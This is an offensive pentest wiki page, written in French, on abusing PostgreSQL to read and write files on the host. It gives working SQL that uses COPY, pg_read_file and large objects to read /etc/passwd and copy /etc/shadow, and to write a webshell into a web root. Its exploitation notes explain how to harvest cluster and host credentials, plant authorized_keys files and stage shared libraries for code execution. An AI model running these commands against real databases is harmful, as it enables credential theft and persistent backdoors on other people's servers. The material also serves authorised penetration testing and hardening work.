---
title: "Accès aux fichiers PostgreSQL : lire et écrire des fichiers de l'hôte"
description: "Lire et écrire des fichiers sur l'hôte PostgreSQL via COPY, les large objects (lo_import/lo_export), et les fonctions côté serveur pg_read_file et pg_ls_dir, afin de voler des secrets, déposer des payloads ou préparer une extension C."
keywords:
  - COPY
  - lo_import
  - lo_export
  - pg_read_file
  - PostgreSQL file read
---

# Accès aux fichiers

PostgreSQL peut lire et écrire des fichiers arbitraires avec son compte de service, ce qui est utile en soi (vol de configuration, de clés et de hash) et comme étape de préparation d'une [extension C](command-execution.md). Le superutilisateur donne accès à tout cela ; certaines fonctions sont accessibles via les rôles `pg_read_server_files` et `pg_write_server_files` sans superutilisateur complet.

## Lecture de fichiers

```sql
-- whole file into a column
CREATE TABLE f (d text); COPY f FROM '/etc/passwd';
SELECT * FROM f;

-- server-side read functions
SELECT pg_read_file('/etc/passwd');
SELECT pg_ls_dir('/var/lib/postgresql');
```

## Écriture de fichiers

```sql
-- COPY out: drop a webshell or an authorized_keys file
COPY (SELECT 'content') TO '/var/www/html/shell.php';

-- large objects: import/export arbitrary bytes (stage a .so for a C function)
SELECT lo_import('/etc/shadow', 1234);
SELECT lo_export(1234, '/tmp/shadow.copy');
```

## Notes d'exploitation

- La **lecture** de fichiers récolte les secrets propres au cluster (`pg_hba.conf`, le répertoire de données, `~/.pgpass`) et les identifiants de l'hôte (`/etc/shadow` si le service s'exécute avec des privilèges), alimentant des accès supplémentaires.
- L'**écriture** de fichiers dépose un webshell sous un chemin servi, un `authorized_keys` dans le répertoire personnel du compte de service, ou un `.so` compilé à transformer en [fonction d'extension C](command-execution.md).
- La voie des large objects (`lo_import`/`lo_export`) écrit des octets bruts, c'est ainsi que vous préparez un binaire que le mode texte de `COPY` corromprait.
- Les écritures sont limitées à ce que le **compte de service** peut écrire, visez donc les chemins qu'il possède ou qu'il sert.

## Outils

- **psql** : exécuter `COPY`, `lo_*` et `pg_read_file` directement.
- **Metasploit** (`postgres_readfile`) : lecture de fichier encapsulée.

## Références

- [PostgreSQL: large object functions](https://www.postgresql.org/docs/current/lo-funcs.html)
- [HackTricks: PostgreSQL file read and write](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
